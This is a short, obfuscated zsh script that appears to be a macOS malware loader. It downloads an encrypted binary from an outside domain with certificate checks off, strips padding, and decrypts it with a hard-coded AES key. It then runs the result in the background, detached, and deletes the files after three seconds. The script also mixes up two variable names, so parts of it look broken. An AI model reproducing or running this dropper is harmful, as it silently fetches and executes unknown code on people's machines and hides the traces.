#!/bin/zsh
hvark=$(mktemp /tmp/snbn26.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/md79d9367f7b20438.bin" -o "$hvarkz" || exit 1
dzwhxn=$(stat -f %z "$hvarkz"); wsp2bt7=$(( dzwhxn - 880 - 193 ))
tail -c +$(( 880 + 1 )) "$hvarkz" | head -c $wsp2bt7 | openssl enc -d -aes-256-cbc -k 3f79a59848b030b9d5f24f84 -out "$hvark" 2>/dev/null
[ -s "$hvark" ] && chmod 700 "$hvark" && ( "$hvark" & ) && disown
( sleep 3; rm -f "$hvark" "$hvarkz" ) &>/dev/null &
